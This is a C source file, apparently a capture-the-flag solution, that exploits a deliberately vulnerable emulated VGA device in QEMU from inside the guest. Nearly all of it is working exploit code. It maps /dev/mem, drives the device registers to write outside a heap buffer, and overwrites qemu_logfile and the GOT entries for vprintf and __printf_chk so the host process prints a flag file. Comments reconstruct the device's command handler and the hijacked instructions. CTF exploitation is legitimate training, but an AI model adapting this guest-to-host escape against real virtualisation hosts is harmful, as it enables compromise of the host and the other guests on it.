/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit && gzip -kf exploit && base64 exploit.gz
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define LOG(...) printf(__VA_ARGS__)

void die(const char* msg) {
    perror(msg);
    _exit(-1);
}

void hexdump(uint8_t *mem, size_t len) {
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

#define CYDF_LOWMEM_ADDR 0xa0000
#define CYDF_LOWMEM_SIZE 0x20000
#define CYDF_MMIO_ADDR 0x00000000febc1000
#define CYDF_MMIO_SIZE 0x10000
#define CYDF_LOWMEM_MAP_BASE (void *)0xdead0000
#define CYDF_MMIO_MAP_BASE (void *)0xcafe0000

void lowmem_write(uint64_t addr, uint8_t value) {
    *((uint8_t*)(CYDF_LOWMEM_MAP_BASE + addr)) = value;
}

uint64_t lowmem_read(uint64_t addr) {
    return *((uint8_t*)(CYDF_LOWMEM_MAP_BASE+ addr));
}

void mmio_write(uint64_t addr, uint8_t value) {
    *((uint8_t*)(CYDF_MMIO_MAP_BASE + addr)) = value;
}

uint64_t mmio_read(uint64_t addr) {
    return *((uint8_t*)(CYDF_MMIO_MAP_BASE+ addr));
}

void set_sr(int idx, int val) {
    mmio_write(0x4, idx);
    mmio_write(0x5, val);
}

/*
 * cmd 0: 
 *  arg 16b
 *  if (vuln_cnt <= 0x10 && arg <= 0x1000) { 
 *      s->vs[vuln_cnt].buf = malloc(arg);
 *      vuln_cnt++;
 *  }
 *
 * cmd 1:
 *  if (idx <= 0x10) {
 *      cur = s->vs[vuln_cnt].cur_size;
 *      max_size = s->vs[vuln_cnt].max_size;
 *      if (cur < max_size) {
 *          s->vs[vuln_cnt].buf[cur] = val;
 *      }
 *  }
 *
 * cmd 2:
 *  printf(s->vs[idx].buf); # leak
 *
 * cmd 3:
 *  if (s->vs[idx].buf) {
 *      s->vs[idx].max_size = arg;
 *  }
 *
 * cmd 4:
 *  if (idx <= 0x10) {
 *      cur = s->vs[vuln_cnt].cur_size;
 *      if (cur <= 0xfff) {
 *          s->vs[vuln_cnt].buf[cur] = val;
 *      }
 *  }
 *   
 */

void cydf_vga_mem_cmd_alloc(uint16_t size) {
    set_sr(0xcc, 0); // sr[0xcc] = 0, cmd 0
    set_sr(0xcd, 1); // idx
    set_sr(0xce, size>>8); // sr[0xcd] = byte2(size) 
    lowmem_write(0x18100, size&0xff);
}

void cydf_vga_mem_cmd_read_8(uint8_t idx, uint8_t byte) {
    set_sr(0xcc, 4); // sr[0xcc] = 4, cmd 4
    set_sr(0xcd, idx); // idx
    lowmem_write(0x18100, byte);
}


void cydf_vga_mem_cmd_read_64(uint8_t idx, uint64_t val) {
    set_sr(0xcc, 4); // sr[0xcc] = 4, cmd 4
    set_sr(0xcd, idx); // idx

    for (int i = 0; i < 8; i++) {
        lowmem_write(0x18100, (val>>(i*8))&0xff);
    }
}

void cydf_vga_mem_cmd_write(uint8_t idx) {
    set_sr(0xcc, 2); // sr[0xcc] = 2, cmd 2
    set_sr(0xcd, idx); // idx
    lowmem_write(0x18100, 0x0);
}

int main(int argc, char const* argv[]) {
    int devmem_fd;

    //mknod /dev/mem c 1 1; mknod /dev/mem c `sed -n 's/ mem$//p' /proc/devices` 1
    mknod("/dev/mem", S_IFCHR, makedev(1, 1));

    devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (devmem_fd < 0) {
        die("open /dev/mem");
    }

    if (!mmap(CYDF_LOWMEM_MAP_BASE, CYDF_LOWMEM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, CYDF_LOWMEM_ADDR)) {
        die("mmap lowmem");
    }
    close(devmem_fd);

    devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (devmem_fd < 0) {
        die("open /dev/mem");
    }

    if (!mmap(CYDF_MMIO_MAP_BASE, CYDF_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, CYDF_MMIO_ADDR)) {
        die("mmap mmio");
    }
    close(devmem_fd);
    
    set_sr(7, 1); // sr[7] = 1

    cydf_vga_mem_cmd_alloc(0xfff);

    // cat flag
    lowmem_read(0x1);
    lowmem_read(0x10cff00>>16);
    lowmem_read(0x10cff00&0xffff);
    cydf_vga_mem_cmd_read_64(0x10, 7449354444534473059);

    // qemu_logfile
    lowmem_read((0x10CCBE0-8)>>16);
    lowmem_read((0x10CCBE0-8)&0xffff);
    cydf_vga_mem_cmd_read_64(0x10, 0x10cff00);

    // vprintf@got
    lowmem_read((0xEE7BB0-16)>>16);
    lowmem_read((0xEE7BB0-16)&0xffff);
    cydf_vga_mem_cmd_read_64(0x10, 0x409DD0);

    // __printf_chk@got
    lowmem_read((0xEE7028-24)>>16);
    lowmem_read((0xEE7028-24)&0xffff);
    cydf_vga_mem_cmd_read_64(0x10, 0x40C07B);
    
/*
 * .text:000000000040C07B                 mov     rax, cs:qemu_logfile
 * .text:000000000040C082                 mov     rdx, [rbp+va]
 * .text:000000000040C086                 mov     rcx, [rbp+fmt]
 * .text:000000000040C08A                 mov     rsi, rcx
 * .text:000000000040C08D                 mov     rdi, rax
 * .text:000000000040C090                 call    _vfprintf
 */
    cydf_vga_mem_cmd_write(0);

/*
 *   # ./solve
 *   flag{testtesttesttest}
 */

    return 0;
}
